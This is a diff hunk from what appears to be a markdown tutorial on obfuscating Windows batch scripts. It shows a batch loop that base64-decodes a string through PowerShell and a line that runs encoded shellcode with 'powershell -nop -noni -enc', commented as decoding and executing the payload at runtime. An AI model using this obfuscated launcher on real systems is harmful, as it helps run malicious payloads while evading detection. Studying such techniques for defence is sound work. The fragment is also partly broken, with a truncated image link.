@@ -167,7 +167,7 @@ The above string can be obfuscated using the **batch special character: ^** <br 
           # https://serverfault.com/questions/349585/how-do-i-set-an-environmental-variable-from-a-powershell-command
           #
           for /F "usebackq tokens=1" %%i in (`powershell ^([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($env:64string))^)`) do set DOW=%%i
-        cmd.exe /c powershell.exe -nop %decoded% -noni -enc $shellcode ::<-- execute/decode the base64 syscall at runtime
+        cmd.exe /c powershell.exe -nop %i% -noni -enc $shellcode ::<-- execute/decode the base64 syscall at runtime
 
 ![batch obfuscation](http://i.)
 
